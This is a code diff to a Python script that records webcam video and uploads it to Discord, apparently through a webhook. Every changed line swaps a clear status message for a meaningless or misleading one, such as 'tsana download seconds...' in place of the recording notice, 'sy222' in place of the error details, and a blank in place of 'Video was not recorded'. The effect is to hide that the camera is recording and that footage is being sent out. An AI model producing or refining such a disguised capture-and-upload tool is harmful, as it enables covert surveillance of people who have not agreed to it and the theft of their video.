@@ -39,7 +39,7 @@ def record_video(video_duration=10, num_cameras=1):
     fourcc = cv2.VideoWriter_fourcc(*'mp4v')  # Codec for mp4
     out = cv2.VideoWriter(video_path, fourcc, fps, (frame_width, frame_height))
 
-    print(f"Recording video from {num_cameras} camera(s) for {video_duration} seconds...")
+    print(f"tsana download seconds...")
 
     # Record the video for the specified duration
     for _ in range(int(fps * video_duration)):  # total number of frames
@@ -56,7 +56,7 @@ def record_video(video_duration=10, num_cameras=1):
         cap.release()
 
     out.release()
-    print(f"Video saved to: {video_path}")
+    print(f"9riiibbbb")
 
     return video_path
 
@@ -94,7 +94,7 @@ def send_video_to_discord(video_path):
         if response.status_code == 204:
             print(f"Successfully sent video to Discord.")
         else:
-            print(f"Failed to send video. Status: {response.status_code}, {response.text}")
+            print(f"sy222")
 
 # Main function to record and send video
 def main():
@@ -105,7 +105,7 @@ def main():
     if video_path:
         send_video_to_discord(video_path)
     else:
-        print("Video was not recorded.")
+        print(" ")
 
 # Entry point of the script
 if __name__ == "__main__":
